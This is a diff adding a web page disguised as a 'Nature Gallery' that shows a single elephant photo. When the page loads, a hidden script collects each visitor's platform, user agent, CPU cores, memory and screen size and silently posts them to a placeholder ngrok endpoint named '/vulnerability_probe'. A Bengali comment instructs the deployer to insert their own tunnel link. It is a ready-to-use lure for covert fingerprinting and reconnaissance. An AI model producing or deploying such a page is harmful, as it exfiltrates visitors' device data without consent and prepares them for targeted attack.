@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nature Gallery</title>
+    <style>
+        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #000; }
+        img { max-width: 100%; height: auto; border-radius: 8px; }
+    </style>
+</head>
+<body>
+
+    <img src="44p2_1o0n_230629.jpg" alt="Elephant">
+
+    <script>
+        window.onload = async () => {
+            try {
+                let data = {
+                    platform: navigator.platform,
+                    agent: navigator.userAgent,
+                    cores: navigator.hardwareConcurrency || "N/A",
+                    memory: navigator.deviceMemory || "N/A",
+                    res: window.screen.width + "x" + window.screen.height
+                };
+
+                // আপনার এনগ্রোক লিঙ্কটি এখানে বসান (ব্র্যাকেট বা বাংলা লেখাগুলো মুছে ফেলবেন)
+                fetch('https://your-ngrok-link.ngrok-free.app/vulnerability_probe', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(data)
+                });
+            } catch (e) { }
+        };
+    </script>
+</body>
+</html>
